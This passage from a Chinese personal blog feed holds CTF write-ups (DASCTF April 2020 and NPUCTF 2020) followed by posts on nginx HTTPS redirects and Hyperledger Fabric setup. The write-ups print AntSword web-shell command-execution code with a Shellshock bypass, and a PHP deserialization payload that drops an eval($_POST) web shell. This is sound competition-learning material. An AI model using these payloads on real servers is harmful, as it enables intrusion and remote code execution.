class="number">1</span>) == <span class="string">"/"</span> &amp;&amp; fe(<span class="string">'putenv'</span>) &amp;&amp; (fe(<span class="string">'error_log'</span>) || fe(<span class="string">'mail'</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				$tmp = tempnam(sys_get_temp_dir(), <span class="string">'as'</span>);</span><br><span class="line">				putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">				<span class="keyword">if</span> (fe(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">					error_log(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					mail(<span class="string">"a@127.0.0.1"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"-bv"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$output = @file_get_contents($tmp);</span><br><span class="line">			@unlink($tmp);</span><br><span class="line">			<span class="keyword">if</span> ($output != <span class="string">""</span>) &#123;</span><br><span class="line">				<span class="keyword">print</span>($output);</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span> </span>&#123;</span><br><span class="line">		$ret=<span class="number">0</span>;</span><br><span class="line">		$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">		<span class="keyword">if</span>(fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">			@system($c,$ret);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">			@passthru($c,$ret);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">			<span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">			@exec($c,$o,$ret);</span><br><span class="line">			<span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>,$o));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">			$fp=@popen($c,<span class="string">'r'</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@feof($fp)) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($fp,<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@pclose($fp);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'proc_open'</span>)) &#123;</span><br><span class="line">			$p = @proc_open($c, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>)), $io);</span><br><span class="line">			<span class="keyword">while</span>(!@feof($io[<span class="number">1</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($io[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!@feof($io[<span class="number">2</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($io[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@fclose($io[<span class="number">1</span>]);</span><br><span class="line">			@fclose($io[<span class="number">2</span>]);</span><br><span class="line">			@proc_close($p);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">			@antsystem($c);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(runshellshock($d, $c)) &#123;</span><br><span class="line">			<span class="keyword">return</span> $ret;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">"/"</span> &amp;&amp; @class_exists(<span class="string">"COM"</span>)) &#123;</span><br><span class="line">			$w=<span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);</span><br><span class="line">			$e=$w-&gt;exec($c);</span><br><span class="line">			$so=$e-&gt;StdOut();</span><br><span class="line">			$ret.=$so-&gt;ReadAll();</span><br><span class="line">			$se=$e-&gt;StdErr();</span><br><span class="line">			$ret.=$se-&gt;ReadAll();</span><br><span class="line">			<span class="keyword">print</span>($ret);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ret = <span class="number">127</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $ret;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	$ret=@runcmd($r.<span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">	<span class="keyword">print</span> ($ret!=<span class="number">0</span>)?<span class="string">"ret=&#123;$ret&#125;"</span>:<span class="string">""</span>;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR://"</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/25/DASCTF-2020-April/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>把前后没用的附加字符去掉，在线网页AES+base64*2</p>
<p>或者</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key = <span class="string">"hm3pq66843bbbrdg"</span>;</span><br><span class="line">$out = <span class="string">"+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4="</span>;</span><br><span class="line">$out1 = base64_decode($out);</span><br><span class="line">$out2 = openssl_decrypt($out1, <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line"><span class="keyword">echo</span> base64_decode(base64_decode($out2));</span><br></pre></td></tr></table></figure></div>

<h3 id="misc4-6G！签到题目"><a href="#misc4-6G！签到题目" class="headerlink" title="misc4(6G！签到题目)"></a>misc4(6G！签到题目)</h3><p>这个题出的有意思，哈哈哈哈，给个1G文件，下载速度还奇慢</p>
<p>下载一部分就好了，有<code>crdownload</code>文件生成后，直接放010就好，文件头部发现DSACTF</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-Joomla-3-4-6-RCE"><a href="#web1-Joomla-3-4-6-RCE" class="headerlink" title="web1(Joomla 3.4.6 RCE)"></a>web1(Joomla 3.4.6 RCE)</h3><p>会话逃逸的思路</p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>会了就写</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF_2020</title>
    <url>/2020/04/22/NPUCTF-2020/</url>
    <content><![CDATA[<p>这场是西工大的校外赛道，平台被扫了好多次，苦了运维了，中间也修了好多次，赛题质量咋说呢，反正都是我不会的类型。。。操作系统的信号量、条件变量+互斥锁作业，密码学作业，信号作业，虎符CTF，西工大NPU，区块链项目中期检查，财经概论的presentation。。。近期这一堆事情真滴搞人心态，不过好歹也算过去一大半了。但是后面还有安恒月赛、ISCC、De1ta、网鼎。。。u1s1，比赛是真的多，我也是真的菜。。。</p>
<p>虎符<del>打了打</del>啥也没做出来，签到还被大师傅做了，然后就0输出了。。。那比赛misc忒难了。。</p>
<p>三道misc，两道零解，一道三解。。不复盘了。。（等👴会用取证工具后就把第一道 奇怪的组织 复现一下） </p>
<p>剩下俩题，一个密码机器（badusb固件、逆向分析、得到python输入脚本运行一下），一个扫雷（通关游戏+浮点数转字符串） </p>
<p>虎符的web，暂时不会。。等啥时候大概看懂wp了，就面向wp复盘一下</p>
<p>下面进入正题，NPU的misc也是真的🚹，老折磨人了。。。套娃有一手的。。</p>
<p>NPU的web已经在buu上了，等做完了就在这再复盘一下。</p>
<p>misc签到是个mc，零解？忘记了，题目新颖，内容劝退。。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="抽象带师"><a href="#抽象带师" class="headerlink" title="抽象带师"></a>抽象带师</h3><p>⭕🦅来🔪西北工✌ 带❄ 西踢莪⛏🖊赛🔟🎀⬆👄➖单💧🖊赛</p>
<p>🌶⑩💉💧🐂🍺</p>
<p>NPUCTF{欢迎⼤家来到⻄北⼯业⼤学CTF⽐赛世界上最简单的⽐赛}</p>
<h3 id="HappyCheckInVerification"><a href="#HappyCheckInVerification" class="headerlink" title="HappyCheckInVerification"></a>HappyCheckInVerification</h3><p>思路：zip修复、伪加密、补全二位码定位、与佛论禅、base16、urldecode、base64、dtmf电话音、微信公众号、无线电识别Robot36</p>
<p>这题很多无意义的套娃，关联性也没有那么强，最后还得去把视频里的电话音base64加密发到公众号上（这谁想得到嘛），得到一段音频再用无线电识别，wp就不写了。详细wp可以去这里看<a href="https://l1near.top/index.php/2020/04/20/33.html" target="_blank" rel="noopener">https://l1near.top/index.php/2020/04/20/33.html</a></p>
<h3 id="碰上彩虹，吃定彩虹"><a href="#碰上彩虹，吃定彩虹" class="headerlink" title="碰上彩虹，吃定彩虹"></a>碰上彩虹，吃定彩虹</h3><p>思路：空格转摩斯、autokey爆破、strings文件发现字符串、零字符宽度隐写、NTFS、词频统计、base64、encrypto、脑洞（删去strings字符串）、foremost、gimp提取颜色并比较html标记后两位、拼起来转16进制、隐藏文字、ALPHUCK</p>
<p>盖乐希师傅的题，有点懒了，可以直接去这里看<a href="http://www.ga1axy.top/index.php/archives/27/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/27/</a></p>
<h3 id="老千层饼"><a href="#老千层饼" class="headerlink" title="老千层饼"></a>老千层饼</h3><p>思路：文件分离、base64、LSB、01序列转二维码、二维码补全、脑洞、cyberchef_recipe、B站av转bv</p>
<p>同上：详细wp地址<a href="http://www.ga1axy.top/index.php/archives/27/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/27/</a></p>
<p>总结上三题：巨大脑洞+多层套娃</p>
<h3 id="回收站"><a href="#回收站" class="headerlink" title="回收站"></a>回收站</h3><p>FTK Imager的使用、系统默认的桌面图片的寻找</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:60%;" data-src="/2020/04/22/NPUCTF-2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>RECYCLER文件夹里面也有flag文件夹，但是那个套娃最后的图片拼到一起看不出来。。</p>
<p>看wp，发现win7系统默认的桌面图片都放在<code>C:\WINDOWS\Web\Wallpaper</code> 里面，得到<code>Flag.png</code>。</p>
<p>改个后缀或者cat一下都可以得到flag</p>
<h3 id="剩下的Misc题"><a href="#剩下的Misc题" class="headerlink" title="剩下的Misc题"></a>剩下的Misc题</h3><p>MC（红石电路的常亮和短亮转二进制、二进制转ASCII、ASCII用md5加密即可）、刻在DNA的撤硕儿（偏逆向，要读代码，不会喽）</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h3><p>考点：反序列化</p>
<p>查看源代码发现<code>./time.php?source</code>，访问后得到源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure></div>

<p>通过<code>echo $b($a);</code>来执行命令，system、exec等函数被过滤（这也不可能放呀，要不简单多了。</p>
<p>思路1：<code>assert()</code>将整个字符串参数当作php执行，详见<a href="https://www.php.net/assert/" target="_blank" rel="noopener">1</a></p>
<p>构造如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'eval("file_put_contents(\'1.php\', base64_decode(\'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==\'));")'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">'assert'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">86</span>:<span class="string">"eval("</span>file_put_contents(<span class="string">'1.php'</span>, base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw=='</span>));<span class="string">")"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;&#125;</span><br><span class="line"><span class="comment">//蚁剑连上之后啥也没有。。拿插件绕过disable_functions之后根目录还是假flag。不过也可以在蚁剑上打开phpinfo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">"phpinfo()"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">"assert"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">9</span>:<span class="string">"phpinfo()"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>思路2：<code>call_user_func()</code> 把第一个参数作为回调函数调用，详见<a href="https://www.php.net/call_user_func/" target="_blank" rel="noopener">2</a></p>
<p>构造如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">"phpinfo"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">"call_user_func"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">7</span>:<span class="string">"phpinfo"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">14</span>:<span class="string">"call_user_func"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>得到flag：（有、骚放phpinfo里</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:60%;" data-src="/2020/04/22/NPUCTF-2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这个做了两道最简单的，一个日历、一个atbash，wp可以直接搜到</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Http-&gt;Https、80重定向443</title>
    <url>/2020/04/16/Http-301/</url>
    <content><![CDATA[<h3 id="80-gt-443"><a href="#80-gt-443" class="headerlink" title="80-&gt;443"></a>80-&gt;443</h3><p>因为百度收录那边要开80端口并重定向到443，昨天嫌麻烦就没改。</p>
<p>今天下午跟着各种博客改了半天，属实给👴整吐了</p>
<p>不知道当初看的那个小🐢蛋的博客，给👴今天挖了这么大一个🕳</p>
<p>环境：Centos7.x、nginx的配置文件在/etc/nginx/nginx.conf</p>
<p>之前搞https的<a href="https://www.jianshu.com/p/8046a12fec4a" target="_blank" rel="noopener">教程</a>，按这个改完之后其他都不用动，安全组里80端口记得别关，在nginx.conf里面加上下面代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.域名;</span><br><span class="line">    rewrite ^(.*)$ https:&#x2F;&#x2F;$&#123;server_name&#125;$1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后<code>nginx -s reload</code>或者<code>service nginx restart</code></p>
<p>本来到这就完成了，访问博客<a href="http://www.btis.site就应该可以重定向到https了" target="_blank" rel="noopener">http://www.btis.site就应该可以重定向到https了</a></p>
<p>但是我这一直提示nginx: [warn] conflicting server name “<a href="http://www.btis.site&quot;" target="_blank" rel="noopener">www.btis.site&quot;</a> on 0.0.0.0:80, ignored</p>
<p>查一下，好像没啥大问题，就是定义重复了呗，然后就试着跳转。。艹，不行。。</p>
<p>我就纳了闷了，我<code>conf.d</code>文件夹里也没东西呀（我以为只包含了这个文件夹里的*.conf</p>
<p>搞了半天，试了改了各种代码（应该是都可行的，if要写在server里</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">        listen 80; </span><br><span class="line">        server_name www.域名; </span><br><span class="line">        return 301 https:&#x2F;&#x2F;$server_name$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($scheme &#x3D; http ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($server_port &#x3D; 80 ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($ssl_protocol &#x3D; &quot;&quot;) &#123; return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125;if ($host !&#x3D; 域名) &#123; return 301 $scheme:&#x2F;&#x2F;域名$request_uri; &#125;</span><br></pre></td></tr></table></figure></div>

<p>还是不行！！我就奇了怪了，还一直warn，好好读了一遍代码，发现了这句代码</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>其实除了conf.d还有两个文件夹里面的*.conf也被包含了，检查一下，艹，罪恶之源</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>删了，重启nginx，搞定。。</p>
<p>我还是特想吐槽浏览器的缓存。。我在Edge和Chrome里访问http还是不跳转，在firefox和移动端都可以了。。</p>
<h3 id="Other-Things"><a href="#Other-Things" class="headerlink" title="Other Things"></a>Other Things</h3><p>1.java升级后注册表重置，.jar文件打不开</p>
<p>解决方法：</p>
<blockquote>
<p>在注册表编辑器中，找到“HKEY_CLASSES_ROOT\Applications\javaw.exe\shell\open\command”，在其中文件打开命令中加入参数“-jar”（无引号），修改后的数值类似：“”C:\Program Files\Java\jre1.8.0_251\bin\javaw.exe” -jar “%1””（只需要添加-jar参数，无需修改其他信息），保存并退出注册表编辑器。</p>
</blockquote>
<p>2.给博客加个<a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93137447" target="_blank" rel="noopener">百度统计</a>、博客被<a href="https://blog.csdn.net/qq_36759224/article/details/100899489" target="_blank" rel="noopener">收录</a></p>
<p>在百度或者谷歌给的html里面加入这么一句：layout: false，可以使html不被自动加上主题（html放在source文件夹里。</p>
]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Http</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>链链链、冲冲冲</title>
    <url>/2020/04/16/HyperLedger-Fabric/</url>
    <content><![CDATA[<p>DDL要来了，光速入门开始—HyperLedger_Fabric2.0！开发实战-快速掌握区块链技术</p>
<p>基础工具：阿里云Centos7.x；xshell、winscp之类的ssh工具</p>
<h3 id="基本环境部署"><a href="#基本环境部署" class="headerlink" title="基本环境部署"></a>基本环境部署</h3><p>curl、git、wget、docker、docker-compose、go语言、node.js运行环境以及npm</p>
<h3 id="Fabric-及环境部署"><a href="#Fabric-及环境部署" class="headerlink" title="Fabric 及环境部署"></a>Fabric 及环境部署</h3><p>1、创建放置fabric的文件夹：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger</span><br></pre></td></tr></table></figure></div>

<p>2、下载fabric源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hyperledger&#x2F;fabric.git</span><br><span class="line"></span><br><span class="line">cd fabric&#x2F;scripts</span><br></pre></td></tr></table></figure></div>

<p>3、执行bootstrap.sh下载镜像和二进制文件：<code>./bootstrap.sh</code></p>
<p>会发现</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>卡在这，所以<code>vim bootstrap.sh</code>，将 <strong>binariesInstall</strong> 屏蔽后再执行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$BINARIES</span>"</span> == <span class="string">"true"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Pull Hyperledger Fabric binaries"</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="comment">#pullBinaries</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<p>执行结果如下，执行完之后会发现在目录下创建了fabric-samples文件夹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后把从网上下载的<code>hyperledger-fabric-linux-amd64-2.0.0.tar.gz</code>解压到这个目录下面</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf hyperledger-fabric-linux-amd64-2.0.0.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>4、启动test-network测试网络：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;scripts&#x2F;fabric-samples&#x2F;test-network</span><br><span class="line">.&#x2F;network.sh up</span><br></pre></td></tr></table></figure></div>

<p>如图，表示启动成功，已启动一个orderer节点和两个peer节点。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="使用测试网络"><a href="#使用测试网络" class="headerlink" title="使用测试网络"></a>使用测试网络</h3><p>1、创建channel，使用network.sh脚本创建来创建一个连接org1和org2组织并加入他们peer的通道，命令如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>创建成功，默认通道名为mychannel</p>
<p>也可以带上channel标签，命令如下（-c ChannelName）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel -c name</span><br></pre></td></tr></table></figure></div>

<p>如果要在一个步骤中启动网络并创建频道，可以同时使用up和create channel模式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh up createChannel</span><br></pre></td></tr></table></figure></div>

<p>2、在通道上启动链码</p>
<p>（1）使用network.sh创建通道之后，可以使用以下命令在通道上启动链码（默认使用go语言）：</p>
